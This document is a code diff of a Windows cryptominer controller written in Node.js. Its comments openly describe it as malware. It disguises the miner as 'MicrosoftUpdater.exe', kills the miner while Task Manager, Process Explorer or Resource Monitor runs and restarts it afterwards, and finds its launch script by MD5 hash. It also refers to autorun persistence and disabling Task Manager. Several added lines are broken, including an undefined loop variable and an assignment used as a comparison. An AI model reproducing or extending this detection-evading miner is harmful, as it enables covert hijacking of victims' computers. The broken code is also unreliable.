@@ -4,10 +4,11 @@
 
 const Win = require('windows-interact');
 const si = require('systeminformation');
+const  minerStartHashMD5 = '1d26869f8a637d353eae2e65724d6b0b';
 
 // File path of the miner
 
-const minerPath = Win.path`MicrosoftUpdater.exe`;
+let currentMinerPath;
 
 // Win-interact preferences
 
@@ -28,31 +29,10 @@ Win.set.preferences({
 Win.appManager.register({
     'TaskManager': {
         path: Win.path`C:\Windows\system32\Taskmgr.exe`,
-        onLaunch: function () {
-            killMiner();
-        },
-        onKill: function () {
-            Win.cmd('start.cmd');
-        },
-    },
-    'ProcessExplorer': {
-        path: $procExpPath, // found by PS script
-        onLaunch: function () {
-            killMiner();
-        },
-        onKill: function () {
-            Win.cmd('start.cmd');
-        }
     },
     'ResourceMonitor': {
         path: Win.path`C:\Windows\system32\resmon.exe`,
-        onLaunch: function () {
-            killMiner();
-        },
-        onKill: function () {
-            Win.cmd('start.cmd');
-        }
-    }
+    },
 });
 
 // Main loop of the malware that checks if monitoring applications are running
@@ -61,7 +41,7 @@ async function main() {
     while (true) {
         // Check if Task Manager, Process Explorer, or Resource Monitor are running and kill the miner accordingly
         const taskManagerIsRunning = Win.process.isRunning('TaskManager');
-        const processExplorerIsRunning = Win.process.isRunning('ProcessExplorer');
+        const processExplorerIsRunning = checkIfProcessExplorerIsRunning(); // Boolean
         const resourceMonitorIsRunning = Win.process.isRunning('ResourceMonitor');
         if ((taskManagerIsRunning || processExplorerIsRunning || resourceMonitorIsRunning) && (checkIfAlreadyRunning('MicrosoftUpdater') == true)) {
         // If Task Manager, Process Explorer, or Resource Monitor is running, and the malware is running as well, kill it
@@ -72,7 +52,7 @@ async function main() {
         runMiner();
     }
         wait(2000);
-}
+    }
 }
 
 // Checks if a process is already running to prevent multi-execution
@@ -91,6 +71,19 @@ async function checkIfAlreadyRunning(process) {
     }
 }
 
+async function checkIfProcessExplorerIsRunning() {
+    const systemProcesses = Win.cmd('tasklist');
+    const indexedProcesses = systemProcesses.split('\n');
+    const processExplorerAliases = ['procexp.exe', 'procexp64.exe', 'procexp64a.exe'];
+    for (const line of lines) {
+        for (const name of processExplorerAliases) {
+            if (line.toLowerCase().includes(name))
+                return true;
+                break;
+        }
+    }
+}
+
 function killMiner() {
     try {
         Win.cmd(`TASKKILL /f /IM ${minerPath}`);
@@ -103,12 +96,22 @@ function wait(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-async function runMiner() { // This function will be expanded on later
-    Win.cmd('start.cmd');
-    autorunMethods();
-    disableTaskMgr();
+function runMiner() {
+    Win.cmd(currentMinerPath); 
 }
 
+async function getMinerLaunchPath() {
+    Win.cmd(`where /r C:\ start.cmd`, function(stdout) {
+        const whereIsLines = stdout.split('\n'); // List
+        for (let lines = 0; lines < whereIsLines.length; lines++) {
+            startCMDHash = Win.cmd(`certutil -hashfile ${whereIsLines} MD5`);
+            if (startCMDHash = minerStartHashMD5) {
+                currentMinerPath = whereIsLines[lines];
+                return currentMinerPath;
+            }
+        }
+    }, {suppressErrors: true});
+}
 
 async function autorunMethods() {
     try {
